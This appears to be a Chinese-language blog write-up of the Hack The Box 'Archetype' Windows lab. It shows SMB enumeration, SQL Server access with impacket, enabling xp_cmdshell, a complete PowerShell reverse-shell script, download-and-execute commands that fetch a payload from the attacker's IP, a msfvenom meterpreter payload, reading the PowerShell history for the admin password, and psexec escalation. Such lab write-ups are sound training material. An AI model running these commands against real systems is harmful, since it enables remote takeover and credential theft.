---
title: HTB-Archetype
description: 'Hack the box'
pubDate: 2024-03-04 
image: /public/hackthebox/Archetype.png
categories:
  - Documentation
tags:
  - Hackthebox
  - Windows Machine
---

## TASK 1
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709125077468-1e24945b-76f7-458f-bfe6-4f804a520c32.png)

nmap -sV -f 10.129.169.148

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709125105804-99afcf45-02f0-43fa-b246-6e88e2af83c2.png)

## TASK 2
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709125116857-4b52581c-0dd9-432f-93f6-9b15aa7062ab.png)

根据hint直接subclient一下

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709125265382-8fd605dd-2002-46a4-b6a7-55335f206531.png)

尾缀没有$就是非管理共享目录

```plain
SMB与CIFS为服务器通信协议，常用于Windows95/98/NT等系统。
smbclient(samba client)可让Linux系统存取Windows系统所分享的资源。
-B<ip地址>：传送广播数据包时所用的IP地址；
-d<排错层级>：指定记录文件所记载事件的详细程度；
-E：将信息送到标准错误输出设备；
-h：显示帮助；
-i<范围>：设置NetBIOS名称范围；
-I<IP地址>：指定服务器的IP地址；
-l<记录文件>：指定记录文件的名称；
-L：显示服务器端所分享出来的所有资源；
-M<NetBIOS名称>：可利用WinPopup协议，将信息送给选项中所指定的主机；
-n<NetBIOS名称>：指定用户端所要使用的NetBIOS名称；
-N：不用询问密码；
-O<连接槽选项>：设置用户端TCP连接槽的选项；
-p<TCP连接端口>：指定服务器端TCP连接端口编号；
-R<名称解析顺序>：设置NetBIOS名称解析的顺序；
-s<目录>：指定smb.conf所在的目录；
-t<服务器字码>：设置用何种字符码来解析服务器端的文件名称；
-T<tar选项>：备份服务器端分享的全部文件，并打包成tar格式的文件；
-U<用户名称>：指定用户名称；
-w<工作群组>：指定工作群组名称。
```

## TASK 3
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709126217614-f36fbc0d-8b95-4e1f-bc03-9993b98068fc.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709126207064-223f4410-4af8-47d2-8328-8410af89797a.png)

使用get将文件下载下来

## TASK 4


![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709126238681-246f0c15-902e-484a-9241-5386d2e15338.png)

这里考察的我们对impacket框架的了解，在impacket中哪个脚本可以连接SQL Server使用git拉取> 



> git clone [https://github.com/SecureAuthCorp/impacket.git](https://github.com/SecureAuthCorp/impacket.git)
>
> cd impacket  
sudo python3 setup.py install  
pip3 install -r requirements.txt
>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709126626723-c742664c-5027-4c5b-aaad-2003e569e1bb.png)

impacket的脚本都在examples里面，看名字知道mssql开头的就是

python mssqlclient.py ARCHETYPE/sql_svc@10.129.219.58 -windows-auth

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709127322891-8b82cac9-0982-44a8-b337-635d5bbce7f6.png)

**<font style="color:rgb(13, 13, 13);">ARCHETYPE/sql_svc</font>**<font style="color:rgb(13, 13, 13);"> 是一个 Windows 认证的用户名，它的格式通常是 </font>**<font style="color:rgb(13, 13, 13);">域/用户名</font>**<font style="color:rgb(13, 13, 13);">。在这种格式中，</font>**<font style="color:rgb(13, 13, 13);">ARCHETYPE</font>**<font style="color:rgb(13, 13, 13);"> 是 Windows 域的名称，而 </font>**<font style="color:rgb(13, 13, 13);">sql_svc</font>**<font style="color:rgb(13, 13, 13);"> 是该域中的用户名。</font>

**<font style="color:rgb(13, 13, 13);">-windows-auth</font>**<font style="color:rgb(13, 13, 13);"> 表示你要使用 Windows 身份验证来连接到 SQL Server，而不是使用 SQL Server 身份验证（即用户名和密码）。</font>

## <font style="color:rgb(13, 13, 13);">TASK 5</font>
<font style="color:rgb(13, 13, 13);"></font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709126750215-79c5a897-3564-4b35-954b-80ec3cde0bd6.png)



![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709126778375-8561fae7-b949-4c40-b442-4c2e10f8ceae.png)

<font style="color:rgb(0, 0, 0);">成功登录之后可以通过输入以下命令判断当前时候拥有sysadmin权限</font>

<font style="color:rgb(0, 0, 0);">SELECT IS_SRVROLEMEMBER('sysadmin')</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709127533101-e94f71ca-8cf3-43c4-a990-c4b5b4af87ba.png)

<font style="color:rgb(0, 0, 0);">1代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">xp_cmdshell</font><font style="color:rgb(0, 0, 0);">来进行远程代码执行</font>

<font style="color:rgb(0, 0, 0);">先使用sp_configure命令查看下配置情况，如果配置表里没有xp_cmdshell一栏，使用如下命令。</font>

```sql
EXEC sp_configure 'Show Advanced Options', 1;			\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项
reconfigure;			\\确认上面操作
```

<font style="color:rgb(0, 0, 0);">再用sp_configure 命令查看下此时的xp_cmdshell命令是否被允许使用，如值为0使用如下命令。</font>

```sql
EXEC sp_configure 'xp_cmdshell', 1						\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令
reconfigure;											\\确认上面的操作
```

尝试执行命令

xp_cmdshell "whoami"

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709127902676-2fd40e36-2d0c-4ce0-8c17-5f1d4931e204.png)

<font style="color:rgb(13, 13, 13);">虽然 </font>**<font style="color:rgb(13, 13, 13);">xp_cmdshell</font>**<font style="color:rgb(13, 13, 13);"> 存储过程允许在 SQL Server 中执行一些操作系统级别的命令，但它的功能是受到限制的，并且在安全性上也存在一些风险。因此，有时候需要直接的操作系统shell来进行更多和更复杂的操作。所以我们要反弹shell</font>

<font style="color:rgb(13, 13, 13);">启动py共享文件</font>

<font style="color:rgb(234, 234, 234);background-color:rgb(0, 0, 0);">python3 -m http.server 80</font>

<font style="color:rgb(234, 234, 234);background-color:rgb(0, 0, 0);">shell.ps1</font>

```sql
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.20",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

<font style="color:rgb(13, 13, 13);">xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.20/shell.ps1\");"</font>

nc -nvlp 443

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709193257304-1d8955f5-157f-4e69-8089-faef5b80c768.png)

<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">在</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">C:\Users\sql_svc\Desktop\user.txt</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">中找到User Own的Flag</font>

3e7b102e78218e935bf3f4951fec21a3

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709193479859-515bf8f3-ec72-4bc6-9e9a-32525abde825.png)

<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">发现sql_svc是操作系统普通用户、数据库以及数据库服务用户，检查一下频繁访问的文件或已执行的命令，使用如下命令来访问PowerShell历史记录文件</font>

```sql
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709193500916-30a4fdb6-8ec6-4bfb-b770-5786ec24f836.png)

<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">发现管理员账号及密码</font>

<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">administrator MEGACORP_4dm1n!!</font>

<font style="color:rgb(234, 234, 234);background-color:rgb(0, 0, 0);"></font>

## <font style="color:rgb(13, 13, 13);">TASK 6</font>
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709128109051-216e6e33-da6c-46b6-b359-cc96572ed897.png)

这里win和Linux都有一个很好的提权脚本叫PEAS

Linux系统叫linpeas，win系统叫winpeas

Git下载地址：[https://github.com/carlospolop/PEASS-ng/releases/tag/20220710](https://github.com/carlospolop/PEASS-ng/releases/tag/20220710)

<font style="color:rgb(68, 68, 68);">（著名的windows信息枚举以发现存在的漏洞）</font>

<font style="color:rgb(68, 68, 68);">将其下载到linux本机</font>

<font style="color:rgb(0, 0, 255);">wget </font>[<font style="color:rgb(68, 68, 68);">https://github.com/carlospolop/PEASS-ng/releases/download/20220320/winPEASx86.exe</font>](https://github.com/carlospolop/PEASS-ng/releases/download/20220320/winPEASx86.exe)

<font style="color:rgb(68, 68, 68);">利用msf反弹shell</font>

<font style="color:rgb(68, 68, 68);">msfvenom -p  windows/meterpreter/reverse_tcp LHOST=</font><font style="color:rgb(13, 13, 13);">10.10.16.20</font><font style="color:rgb(68, 68, 68);"> -f exe -o payload.exe</font>

<font style="color:rgb(68, 68, 68);">在kali Linux本地运行http服务器（用python http模块）</font>

<font style="color:rgb(68, 68, 68);">SQL> xp_cmdshell "powershell wget http://</font><font style="color:rgb(13, 13, 13);">10.10.16.20</font><font style="color:rgb(68, 68, 68);">/payload.exe -OutFile c:\\Users\Public\\payload.exe"</font>

<font style="color:rgb(68, 68, 68);">set payload windows/meterpreter/reverse_tcp</font>

<font style="color:rgb(68, 68, 68);">set lhost </font><font style="color:rgb(13, 13, 13);">10.10.16.20</font>

<font style="color:rgb(13, 13, 13);">EXEC xp_cmdshell 'C:\Users\Public\payload.exe';</font>

<font style="color:rgb(13, 13, 13);">run（进行监听）</font>

EXEC xp_cmdshell 'C:\Users\Public\payload.exe';  进行执行

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709199972513-879d0c76-5caf-4ae0-9cb0-3df047300d13.png)

<font style="color:rgb(68, 68, 68);">成功获得user的flag</font>

<font style="color:rgb(68, 68, 68);"></font>

也可以尝试<font style="color:rgb(0, 0, 0);">直接使用Impacket中的</font>psexec提权，其原理是：

> 1.通过ipc$连接，释放psexecsvc.exe到目标
>
> 2.通过服务管理SCManager远程创建psexecsvc服务，并启动服务。
>
> 3.客户端连接执行命令，服务端启动相应的程序并执行回显数据。
>
> 4.运行完后删除服务。这个在windows的日志中有详细的记录，另外psexec在少数情况下会出现服务没删除成功的bug。
>

           



<font style="color:rgb(0, 0, 0);">也可以</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">psexec.py</font><font style="color:rgb(0, 0, 0);">来提权</font>

<font style="color:rgb(0, 0, 0);">psexec.py administrator@10.10.10.27</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709193783317-b44d9244-5e48-4e5f-a114-1e52e91f98c4.png)

<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">执行 </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">type C:\Users\Administrator\Desktop\root.txt</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);"> 命令成功拿到System Own的Flag</font>

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);"></font>

